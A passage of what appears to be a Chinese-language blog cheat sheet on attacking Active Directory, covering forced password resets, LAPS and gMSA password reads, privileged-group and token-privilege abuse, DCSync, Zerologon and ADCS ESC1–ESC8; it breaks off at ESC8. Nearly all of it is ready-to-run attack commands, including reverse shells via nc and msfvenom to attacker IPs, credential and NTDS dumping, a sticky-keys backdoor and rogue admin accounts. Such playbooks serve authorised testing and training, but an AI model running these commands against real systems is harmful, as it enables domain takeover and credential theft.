+<h3 id="强制修改密码"><a href="#强制修改密码" class="headerlink" title="强制修改密码"></a><strong>强制修改密码</strong></h3><pre class="language-bash" data-language="bash"><code class="language-bash">net rpc password <span class="token string">"<span class="token variable">$TargetUser</span>"</span> <span class="token parameter variable">-U</span> <span class="token string">"<span class="token variable">$DOMAIN</span>"</span>/<span class="token string">"<span class="token environment constant">$USER</span>"</span> <span class="token parameter variable">-S</span> <span class="token string">"<span class="token variable">$DC_HOST</span>"</span>
+
+net rpc password <span class="token string">"<span class="token variable">$TargetUser</span>"</span> <span class="token parameter variable">-U</span> <span class="token string">"<span class="token variable">$DOMAIN</span>"</span>/<span class="token string">"<span class="token environment constant">$USER</span>"</span>%<span class="token string">"<span class="token variable">$PASSWORD</span>"</span> <span class="token parameter variable">-S</span> <span class="token string">"<span class="token variable">$DC_HOST</span>"</span>
+
+pth-net rpc password <span class="token string">"<span class="token variable">$TargetUser</span>"</span> <span class="token parameter variable">-U</span> <span class="token string">"<span class="token variable">$DOMAIN</span>"</span>/<span class="token string">"<span class="token environment constant">$USER</span>"</span>%<span class="token string">"ffffffffffffffffffffffffffffffff"</span><span class="token builtin class-name">:</span><span class="token string">"<span class="token variable">$NT_HASH</span>"</span> <span class="token parameter variable">-S</span> <span class="token string">"<span class="token variable">$DC_HOST</span>"</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">rpcclient <span class="token parameter variable">-U</span> <span class="token variable">$DOMAIN</span>/<span class="token variable">$ControlledUser</span> <span class="token variable">$DomainController</span>
+
+rpcclient $<span class="token operator">></span> setuserinfo2 <span class="token variable">$TargetUser</span> <span class="token number">23</span> <span class="token variable">$NewPassword</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">bloodyAD <span class="token parameter variable">--host</span> <span class="token string">"<span class="token variable">$DC_IP</span>"</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$DOMAIN</span>"</span> <span class="token parameter variable">-u</span> <span class="token string">"<span class="token environment constant">$USER</span>"</span> <span class="token parameter variable">-p</span> <span class="token string">"<span class="token variable">$PASSWORD</span>"</span> <span class="token builtin class-name">set</span> password <span class="token string">"<span class="token variable">$TargetUser</span>"</span> <span class="token string">"<span class="token variable">$NewPassword</span>"</span></code></pre>
+
+<h3 id="读取LAPS-密码"><a href="#读取LAPS-密码" class="headerlink" title="读取LAPS 密码"></a><strong>读取LAPS 密码</strong></h3><pre class="language-bash" data-language="bash"><code class="language-bash">pyLAPS.py <span class="token parameter variable">--action</span> get <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$DOMAIN</span>"</span> <span class="token parameter variable">-u</span> <span class="token string">"<span class="token environment constant">$USER</span>"</span> <span class="token parameter variable">-p</span> <span class="token string">"<span class="token variable">$PASSWORD</span>"</span> --dc-ip <span class="token string">"<span class="token variable">$DC_IP</span>"</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">nxc ldap <span class="token string">"<span class="token variable">$DC_HOST</span>"</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$DOMAIN</span>"</span> <span class="token parameter variable">-u</span> <span class="token string">"<span class="token environment constant">$USER</span>"</span> <span class="token parameter variable">-p</span> <span class="token string">"<span class="token variable">$PASSWORD</span>"</span> <span class="token parameter variable">--module</span> laps</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">bloodyAD <span class="token parameter variable">--host</span> <span class="token string">"<span class="token variable">$DC_IP</span>"</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$DOMAIN</span>"</span> <span class="token parameter variable">-u</span> <span class="token string">"<span class="token environment constant">$USER</span>"</span> <span class="token parameter variable">-p</span> <span class="token string">"<span class="token variable">$PASSWORD</span>"</span> get search <span class="token parameter variable">--filter</span> <span class="token string">'(ms-mcs-admpwdexpirationtime=*)'</span> <span class="token parameter variable">--attr</span> ms-mcs-admpwd,ms-mcs-admpwdexpirationtime</code></pre>
+
+<h3 id="读取GMSA密码"><a href="#读取GMSA密码" class="headerlink" title="读取GMSA密码"></a><strong>读取GMSA密码</strong></h3><pre class="language-bash" data-language="bash"><code class="language-bash">gMSADumper.py <span class="token parameter variable">-u</span> <span class="token string">'user'</span> <span class="token parameter variable">-p</span> <span class="token string">'password'</span> <span class="token parameter variable">-d</span> <span class="token string">'domain.local'</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">ntlmrelayx.py <span class="token parameter variable">-t</span> ldaps://10.0.0.5 <span class="token parameter variable">-debug</span> --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">bloodyAD <span class="token parameter variable">--host</span> <span class="token string">"<span class="token variable">$DC_IP</span>"</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$DOMAIN</span>"</span> <span class="token parameter variable">-u</span> <span class="token string">"<span class="token environment constant">$USER</span>"</span> <span class="token parameter variable">-p</span> <span class="token string">"<span class="token variable">$PASSWORD</span>"</span> get object <span class="token variable">$TargetObject</span> <span class="token parameter variable">--attr</span> msDS-ManagedPassword</code></pre>
+
+
+
+<h2 id="特权组和特权"><a href="#特权组和特权" class="headerlink" title="特权组和特权"></a><strong>特权组和特权</strong></h2><h3 id="Account-Operators"><a href="#Account-Operators" class="headerlink" title="Account Operators"></a><strong>Account Operators</strong></h3><p>Account Operators是AD中的内置组，允许成员管理用户和组帐户。成员可以创建、修改和删除帐户，但管理权限有限。</p>
+<p>添加用户</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">net user NewUser password /domain /add</code></pre>
+
+<p>将用户添加到组</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">net group <span class="token string">"EXCHANGE WINDOWS PERMISSIONS"</span> <span class="token punctuation">&#123;</span>NewUser<span class="token punctuation">&#125;</span> /add /domain</code></pre>
+
+
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">bloodyAD <span class="token parameter variable">-d</span> domain.local <span class="token parameter variable">--host</span> x.x.x.x <span class="token parameter variable">-u</span> username <span class="token parameter variable">-p</span> username <span class="token builtin class-name">set</span> password target_user new_password <span class="token comment">#修改密码</span>
+
+bloodAD <span class="token parameter variable">-d</span> domain.local <span class="token parameter variable">--host</span> x.x.x.x <span class="token parameter variable">-u</span> username <span class="token parameter variable">-p</span> username <span class="token function">add</span> groupMember <span class="token string">'Remote Management Users'</span> user_to_add  <span class="token comment">#添加到组</span></code></pre>
+
+<h3 id="Backup-Operators"><a href="#Backup-Operators" class="headerlink" title="Backup Operators"></a><strong>Backup Operators</strong></h3><p>Backup Operators是 Active Directory 环境中的内置组，它授予成员备份和还原文件的能力，而不管文件权限如何。此组的成员可以绕过 NTFS 权限，在系统上执行备份和还原作。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">smbserver.py share <span class="token builtin class-name">.</span> <span class="token parameter variable">-smb2support</span>
+impacket-reg <span class="token string">"soupedecode.local"</span>/<span class="token string">"zximena448"</span><span class="token builtin class-name">:</span><span class="token string">"internet"</span>@<span class="token string">"192.168.56.126"</span> backup <span class="token parameter variable">-o</span> <span class="token string">'\\192.168.56.104\share'</span>
+secretsdump.py <span class="token parameter variable">-system</span> SYSTEM.save <span class="token parameter variable">-sam</span> SAM.save <span class="token parameter variable">-security</span> SECURITY.save <span class="token builtin class-name">local</span> </code></pre>
+
+<h3 id="Server-Operators"><a href="#Server-Operators" class="headerlink" title="Server Operators"></a><strong>Server Operators</strong></h3><p>Active Directory 中的一个内置组，它向成员授予域控制器的特定管理功能。成员可以管理服务，包括启动和停止大多数服务、执行备份和恢复作、关闭和重新启动服务器以及处理磁盘管理任务。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#列出所有服务</span>
+services
+
+<span class="token comment">#使用有效负载配置服务。停止和启动服务</span>
+sc.exe config VGAuthService <span class="token assign-left variable">binPath</span><span class="token operator">=</span><span class="token string">"C:\Users\svc-printer\Documents<span class="token entity" title="\n">\n</span>c.exe -e cmd.exe 10.10.14.4 443"</span>
+sc.exe stop VGAuthService
+sc.exe start VGAuthService
+
+sc.exe config VGAuthService <span class="token assign-left variable">binPath</span><span class="token operator">=</span> <span class="token string">"cmd /c net localgroup Administrators server_adm /add"</span></code></pre>
+
+<h3 id="SeLoadDriverPrivilege"><a href="#SeLoadDriverPrivilege" class="headerlink" title="SeLoadDriverPrivilege"></a><strong>SeLoadDriverPrivilege</strong></h3><p>字面意思，安装和卸载驱动的权限。</p>
+<p>能加载驱动，那么在系统内核级别执行代码也是可能的。</p>
+<p>无论它是否显示 priv 已禁用，我们都可以启用它并通过上传恶意驱动程序并使用该驱动程序来利用它。</p>
+<p>默认在域管和Print Operator组上都有这个权限</p>
+<p>驱动加载器</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp">https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp</a></p>
+<p>下载下来把头文件的<code>#include &quot;stdafx.h&quot;</code>去掉然后编译就好了</p>
+<p>然后需要一个驱动文件</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys</a></p>
+<p>还有执行脚本的exp</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom">https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom</a></p>
+<p>不过这个工具默认执行的cmd也就是弹出一个system权限的cmd，可以改一下修改成反弹shell的exe</p>
+<p><img src="https://img.picgo.net/2024/08/08/image2a4b010a0a99baa0.png" alt="image" loading="lazy"></p>
+<p><img src="https://img.picgo.net/2024/08/08/imagece049666f6c29040.png" alt="image" loading="lazy"></p>
+<p>然后编译生成<code>exp.exe</code></p>
+<p>然后把三个文件和一个反弹shell的exe传到靶机</p>
+<p>加载驱动</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">./LoadDriver.exe System/CurrentControlSet<span class="token punctuation">\</span>abcdefg c:<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>Capcom.sys</code></pre>
+
+<p>执行exp</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">./exp.exe</code></pre>
+
+<h3 id="SeBackupPrivilege"><a href="#SeBackupPrivilege" class="headerlink" title="SeBackupPrivilege"></a><strong>SeBackupPrivilege</strong></h3><p>卷影拷贝</p>
+<p>用来实现备份操作，对当前系统任意文件具有读权限</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">reg save hklm<span class="token punctuation">\</span>sam c:<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>sam
+reg save hklm<span class="token punctuation">\</span>system c:<span class="token punctuation">\</span>Temp<span class="token punctuation">\</span>system</code></pre>
+
+<p>kail创建raj.dsh</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> context persistent nowriters
+<span class="token function">add</span> volume c: <span class="token builtin class-name">alias</span> raj
+create
+expose %raj% z:</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">unix2dos raj.dsh </code></pre>
+
+<p>靶机执行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">upload raj.dsh
+diskshadow /s raj.dsh
+RoboCopy /b z:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>ntds <span class="token builtin class-name">.</span> ntds.dit
+reg save hklm<span class="token punctuation">\</span>system system
+download ntds.dit
+download system</code></pre>
+
+
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">secretsdump.py  <span class="token parameter variable">-ntds</span> ntds.dit <span class="token parameter variable">-system</span> system <span class="token builtin class-name">local</span> </code></pre>
+
+<h3 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a><strong>SeImpersonatePrivilege</strong></h3><p>土豆提权</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">C:/Users/MSSQLSERVER/Desktop/GodPotato-NET4.exe  <span class="token parameter variable">-cmd</span> <span class="token string">"C:/Users/MSSQLSERVER/Desktop/nc64.exe  172.22.2.7 4567 -e cmd"</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">C:/Users/MSSQLSERVER/Desktop/GodPotato-NET4.exe  <span class="token parameter variable">-cmd</span> <span class="token string">"net user tao0845 123456qwe. /add"</span>
+C:/Users/MSSQLSERVER/Desktop/GodPotato-NET4.exe  <span class="token parameter variable">-cmd</span> <span class="token string">"net localgroup administrators tao0845 /add"</span></code></pre>
+
+<h3 id="SeAssignPrimaryPrivilege"><a href="#SeAssignPrimaryPrivilege" class="headerlink" title="SeAssignPrimaryPrivilege"></a><strong>SeAssignPrimaryPrivilege</strong></h3><p>可以土豆提权</p>
+<h3 id="SeTcbPrivilege"><a href="#SeTcbPrivilege" class="headerlink" title="SeTcbPrivilege"></a><strong>SeTcbPrivilege</strong></h3><p>等同于获得了系统的最高权限</p>
+<ol>
+<li>调用LsaLogonUser获得Token</li>
+<li>将该Token添加至Local System account组</li>
+<li>该Token具有System权限</li>
+</ol>
+<p>可供参考的测试代码：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeTcbPrivilege.cpp">https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeTcbPrivilege.cpp</a></p>
+<p>代码实现了开启当前进程的SeTcbPrivilege权限，登录用户test1,将其添加至Local System account组，获得System权限，创建注册表项<code>HKEY_LOCAL_MACHINE\SOFTWARE\testtcb</code></p>
+<h3 id="SeRestorePrivilege"><a href="#SeRestorePrivilege" class="headerlink" title="SeRestorePrivilege"></a><strong>SeRestorePrivilege</strong></h3><p>用来实现恢复操作，对当前系统任意文件具有写权限</p>
+<p>利用思路1</p>
+<ol>
+<li>获得SeRestorePrivilege权限，修改注册表<code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code></li>
+<li>劫持exe文件的启动</li>
+<li>实现提权或是作为后门</li>
+</ol>
+<p>利用思路2</p>
+<ol>
+<li>获得SeRestorePrivilege权限，向任意路径写入dll文件</li>
+<li>实现dll劫持</li>
+<li>实现提权或是作为后门</li>
+</ol>
+<p>直接修改粘滞键为cmd</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span> ren sethc.exe sethc.exe.bak
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span> ren cmd.exe sethc.exe</code></pre>
+
+<p>shift 5次后出现管理员的cmd</p>
+<h3 id="DNSAdmins"><a href="#DNSAdmins" class="headerlink" title="DNSAdmins"></a><strong>DNSAdmins</strong></h3><p>特权组，可以以system权限执行任意dll</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.10.3 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> dll <span class="token parameter variable">-o</span> exp.dll </code></pre>
+
+<p>kali开个smb共享</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">impacket-smbserver <span class="token parameter variable">-smb2support</span>  <span class="token string">"share"</span> <span class="token builtin class-name">.</span> </code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Suneo<span class="token punctuation">\</span>Desktop<span class="token operator">></span> dnscmd  /config /serverlevelplugindll <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.10.3<span class="token punctuation">\</span>share<span class="token punctuation">\</span>exp.dll
+<span class="token comment">#重启DNS服务</span>
+ sc.exe <span class="token punctuation">\</span><span class="token punctuation">\</span>DORAEMON.THL stop dns
+ sc.exe <span class="token punctuation">\</span><span class="token punctuation">\</span>DORAEMON.THL start dns</code></pre>
+
+<h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a><strong>DCSync</strong></h2><p>在不同的域控制器之间，每15分钟就会有一次数据同步。DCSync就是利用这个原理，通过<code>Directory Replication Service（DRS）</code></p>
+<p>服务的GetNCChanges接口向域控发起数据同步请求。</p>
+<p>只要域用户拥有以下三条DACL即可向域控发出数据同步请求，从而dump去域内用户hash</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">复制目录更改（DS-Replication-Get-Changes）
+
+全部复制目录更改 <span class="token punctuation">(</span>DS-Replication-Get-Changes-All <span class="token punctuation">)</span>
+
+在过滤集中复制目录更改<span class="token punctuation">(</span>可有可无<span class="token punctuation">)</span>（DS-Replication-Get-Changes-In-Filtered-Set）</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz.exe
+privilege::debug
+lsadump::dcsync /dc:dc01.contoso.org /domain:contoso.org /all /csv</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">impacket-secretsdump <span class="token parameter variable">-outputfile</span> <span class="token string">'dcsync.txt'</span> <span class="token string">'contoso.org/username:userpassword@dc-ip-address'</span>
+
+impacket-secretsdump <span class="token parameter variable">-outputfile</span> <span class="token string">'dcsync.txt'</span> <span class="token parameter variable">-hashes</span> <span class="token string">'lm-hash'</span><span class="token builtin class-name">:</span><span class="token string">'nt-hash'</span> <span class="token string">'contoso.org/username@dc-ip-address'</span>
+
+
+python impacket-getTGT -dc-ip domain-controller-ip <span class="token parameter variable">-hashes</span> lm-hash:nt-hash <span class="token string">'contoso.org/username'</span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span><span class="token string">'username.ccache'</span>
+impacket-secretsdump <span class="token parameter variable">-k</span> <span class="token parameter variable">-outputfile</span> <span class="token string">'something'</span> <span class="token string">'contoso.org/username@dc-fqdn'</span></code></pre>
+
+<h2 id="Zerologon"><a href="#Zerologon" class="headerlink" title="Zerologon"></a><strong>Zerologon</strong></h2><p>ZeroLogon (CVE-2020-1472) 影响域内登录认证协议Netlogon (MS-NRPC) 中所使用的加密身份验证方案 (AES-CFB8)，在通过NetLogon协议与AD域控建立安全通道时，强行登录尝试，对全零的纯文本应用AES-CFB8加密将导致全零的密文，从而可以绕过正常认证，进一步可获取域管理员HASH，获取域管权限。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#验证是否存在漏洞</span>
+lsadump::zerologon /target:192.168.0.111 /account:win-3o8g1o8vv2e$
+
+<span class="token comment">#将机器账户密码置零</span>
+lsadump::zerologon /target:192.168.0.111 /account:win-3o8g1o8vv2e$ /exploit
+或
+python3 cve-2020-1472-exploit.py DC01 <span class="token number">192.168</span>.43.100
+
+<span class="token comment">#dcsync获取域管哈希</span>
+mimikatz.exe <span class="token string">"lsadump::dcsync /domain:main.test.com /dc:DC01 /user:administrator /authuser:DC01$ /authdomain:main /authpassword:"</span>" /authntlm" <span class="token builtin class-name">exit</span>
+或
+python3 secretsdump.py <span class="token parameter variable">-hashes</span> :31d6cfe0d16ae931b73c59d7e0c089c0 MAIN/DC01<span class="token variable">$@</span><span class="token number">192.168</span>.43.100
+<span class="token comment">#31d6cfe0d16ae931b73c59d7e0c089c0是空值的HASH</span>
+</code></pre>
+
+<h2 id="Runas"><a href="#Runas" class="headerlink" title="Runas"></a>Runas</h2><p>以指定用户执行命令</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">RunasCs.exe administrator s67u84zKq8IXw <span class="token string">"cmd /c c:<span class="token entity" title="\t">\t</span>mp<span class="token entity" title="\n">\n</span>c.exe 10.10.14.154 2222 -e cmd.exe"</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string">"DOMAIN\username"</span>
+<span class="token variable">$plainPassword</span> <span class="token operator">=</span> <span class="token string">"Password123"</span> 
+<span class="token variable">$securePassword</span> <span class="token operator">=</span> ConvertTo-SecureString <span class="token variable">$plainPassword</span> <span class="token parameter variable">-AsPlainText</span> <span class="token parameter variable">-Force</span>
+<span class="token variable">$cred</span> <span class="token operator">=</span> New-Object System.Management.Automation.PSCredential<span class="token punctuation">(</span><span class="token variable">$user</span>, <span class="token variable">$securePassword</span><span class="token punctuation">)</span>
+ 
+Start-Process <span class="token parameter variable">-FilePath</span> <span class="token string">"C:\Path\To\Program.exe"</span> <span class="token parameter variable">-Credential</span> <span class="token variable">$cred</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">.<span class="token punctuation">\</span>PsExec64.exe <span class="token parameter variable">-accepteula</span> <span class="token parameter variable">-u</span> DOMAIN<span class="token punctuation">\</span><span class="token environment constant">USER</span> <span class="token parameter variable">-p</span> Password123 <span class="token string">"C:\windows<span class="token entity" title="\t">\t</span>asks\shell.exe"</span></code></pre>
+
+<h2 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h2><h3 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h3><p>利用的前置条件</p>
+<ul>
+<li><strong>msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT</strong><br>表示基于此证书模板申请新证书的用户可以为其他用户申请证书，即任何用户，包括域管理员用户</li>
+<li><strong>PkiExtendedKeyUsage: Client Authentication</strong><br>表示将基于此证书模板生成的证书可用于对 Active Directory 中的计算机进行身份验证</li>
+<li><strong>Enrollment Rights: NT Authority\Authenticated Users</strong><br>表示允许 Active Directory 中任何经过身份验证的用户请求基于此证书模板生成的新证书</li>
+</ul>
+<pre class="language-bash" data-language="bash"><code class="language-bash">certipy-ad <span class="token function">find</span> <span class="token parameter variable">-u</span> zhangsan@red.lab <span class="token parameter variable">-p</span> zs@123456 -dc-ip <span class="token number">192.168</span>.149.133 <span class="token parameter variable">-vulnerable</span> <span class="token parameter variable">-stdout</span></code></pre>
+
+<p>如果找到可以利用的模板ECS1,注册域管的证书</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">certipy-ad req <span class="token parameter variable">-u</span> zhangsan@red.lab <span class="token parameter variable">-p</span> zs@123456 <span class="token parameter variable">-target</span> <span class="token number">192.168</span>.149.135 <span class="token parameter variable">-ca</span> red-ADCS-CA <span class="token parameter variable">-template</span> ESC1 <span class="token parameter variable">-upn</span> administrator@red.lab
+
+<span class="token comment">#用证书请求TGT拿到域管哈希</span>
+certipy-ad auth <span class="token parameter variable">-pfx</span> administrator.pfx -dc-ip <span class="token number">192.168</span>.149.133
+
+secretsdump.py red.lab/administrator@192.168.149.133 -just-dc-user red/krbtgt <span class="token parameter variable">-hashes</span> :nthash</code></pre>
+
+<h3 id="ESC2"><a href="#ESC2" class="headerlink" title="ESC2"></a>ESC2</h3><p>与ESC1相比，ESC2的模板的应用程序策略为无，即没有启用<code>客户端身份验证</code>的功能。</p>
+<p><code>pkiextendedkeyusage</code>为null。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ADScan.exe DomainGather /ADCS</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">certipy-ad req <span class="token parameter variable">-u</span> alimaomao@zpchcbd.com <span class="token parameter variable">-p</span> admin@123 <span class="token parameter variable">-ca</span> adcs <span class="token parameter variable">-target</span> <span class="token number">192.168</span>.75.156 <span class="token parameter variable">-template</span> ESC2</code></pre>
+
+<p>使用alimaomao证书代理申请Administrator证书，注意<code>-on-behalf-of</code>参数值必须是<code>DOMAIN\USER</code>的形式</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">certipy-ad req <span class="token parameter variable">-u</span> alimaomao@zpchcbd.com <span class="token parameter variable">-p</span> admin@123 <span class="token parameter variable">-ca</span> adcs <span class="token parameter variable">-target</span> <span class="token number">192.168</span>.75.156 <span class="token parameter variable">-template</span> User -on-behalf-of <span class="token string">'zpchcbd\Administrator'</span> <span class="token parameter variable">-pfx</span> alimaomao.pfx <span class="token parameter variable">-debug</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">certipy-ad auth <span class="token parameter variable">-pfx</span> administrator.pfx -dc-ip <span class="token number">192.168</span>.75.202</code></pre>
+
+<h3 id="ESC3"><a href="#ESC3" class="headerlink" title="ESC3"></a>ESC3</h3><p>与ESC1和ESC2的EKU不同,这里的模板的应用程序策略为<code>证书申请代理</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">ADScan.exe DomainGather /ADCS</code></pre>
+
+<p>以ESC3为模板申请证书</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">certipy-ad req <span class="token parameter variable">-u</span> alimaomao@zpchcbd.com <span class="token parameter variable">-p</span> admin@123 <span class="token parameter variable">-ca</span> adcs <span class="token parameter variable">-target</span> <span class="token number">192.168</span>.75.156 <span class="token parameter variable">-template</span> ESC3</code></pre>
+
+<p>使用alimaomao证书代理申请Administrator证书，注意<code>-on-behalf-of</code>参数值必须是<code>DOMAIN\USER</code>的形式</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">certipy-ad req <span class="token parameter variable">-u</span> alimaomao@zpchcbd.com <span class="token parameter variable">-p</span> admin@123 <span class="token parameter variable">-ca</span> adcs <span class="token parameter variable">-target</span> <span class="token number">192.168</span>.75.156 <span class="token parameter variable">-template</span> User -on-behalf-of <span class="token string">'zpchcbd\Administrator'</span> <span class="token parameter variable">-pfx</span> alimaomao.pfx <span class="token parameter variable">-debug</span></code></pre>
+
+<p>使用上面申请到的administrator.fpx来向域控机器进行身份认证</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">certipy-ad auth <span class="token parameter variable">-pfx</span> administrator.pfx -dc-ip <span class="token number">192.168</span>.75.202</code></pre>
+
+<h3 id="ESC4"><a href="#ESC4" class="headerlink" title="ESC4"></a>ESC4</h3><p>WriteDACL -&gt;ESC1&#x2F;2&#x2F;3</p>
+<h3 id="ESC6"><a href="#ESC6" class="headerlink" title="ESC6"></a>ESC6</h3><p>在企业内部基于 PKI 为 Web 服务器颁发证书的场景中，管理员为给证书添加额外主机名，会在 CA 上设置<code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>标志。然而，按照微软描述，设置该标志后，攻击者能利用这一机制为任意域用户注册证书。这意味着攻击者可以伪造合法用户的身份证书，从而突破企业基于证书的身份验证机制。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Certify.exe request /ca:adcs.lutra.com<span class="token punctuation">\</span>lutra-ADCS-CA /template:User /altname:administrator</code></pre>
+
+<p>将申请的证书复制保存为esc6.pem，使用openssl转为esc6.pfx，密码为空即可</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">openssl pkcs12 <span class="token parameter variable">-in</span> cert.pem <span class="token parameter variable">-keyex</span> <span class="token parameter variable">-CSP</span> <span class="token string">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="token parameter variable">-export</span> <span class="token parameter variable">-out</span> cert.pfx</code></pre>
+
+<p>使用Rubeus请求域管administrator的TGT</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Rubeus.exe asktgt /user:administrator /certificate:esc6.pfx /dc:192.168.110.127 /ptt</code></pre>
+
+<p>将域控制器身份验证注册后再次执行，成功导入票据</p>
+<h3 id="ESC7"><a href="#ESC7" class="headerlink" title="ESC7"></a>ESC7</h3><p>不仅证书配置错误方面可能导致ADCS攻击，当证书颁发机构访问权限配置不当时也存在问题。</p>
+<p>主要的两个权限是<strong>ManageCA</strong>权限和<strong>ManageCertificates</strong>权限，也就是就是“管理CA”和“颁发和管理证书”。</p>
+<p><strong>利用一：启用EDITF_ATTRIBUTESUBJECTALTNAME2进行ESC6</strong></p>
+<p>使用PSPKI启用<strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong>：</p>
+<pre class="language-none"><code class="language-none">Import-Module -Name PSPKI
+$configReader&#x3D;New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD &quot;DC1.t0ngmystictestad.com&quot;
+$configReader.SetRootNode($true)
+$configReader.GetConfigEntry(&quot;EditFlags&quot;,&quot;PolicyModulesCertificateAuthority_MicrosoftDefault.Policy&quot;)
+$configReader.SetConfigEntry(1376950,&quot;EditFlags&quot;,&quot;PolicyModulesCertificateAuthority_MicrosoftDefault.Policy&quot;)</code></pre>
+
+<p>AD域-ADCS错误配置-ESC5-ESC6中提到的修改<strong>EDITF_ATTRIBUTESUBJECALTNAME2</strong>需要重启CertSvc服务才能生效</p>
+<p>之后打ESC6即可</p>
+<h3 id="ESC8"><a href="#ESC8" class="headerlink" title="ESC8"></a>ESC8</h3><p>ADCS在默认安装的时候，其Web接口支持NTLM身份验证并且没有启用任何NTLM Relay保护措施。强制域控制器计算机帐户(DC$)向配置了NTLM中继的主机进行身份验证。身份验证被转发给证书颁发机构(CA)并提出对证书的请求。获取到了DC$的证书后就可以为用户&#x2F;机器请求TGS&#x2F;TGT票据，获取相应的权限。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">certipy-ad <span class="token function">find</span> <span class="token parameter variable">-u</span> zhangsan@red.lab <span class="token parameter variable">-p</span> zs@123456 -dc-ip <span class="token number">192.168</span>.149.133 <span class="token parameter variable">-vulnerable</span> <span class="token parameter variable">-stdout</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#中继监听</span>
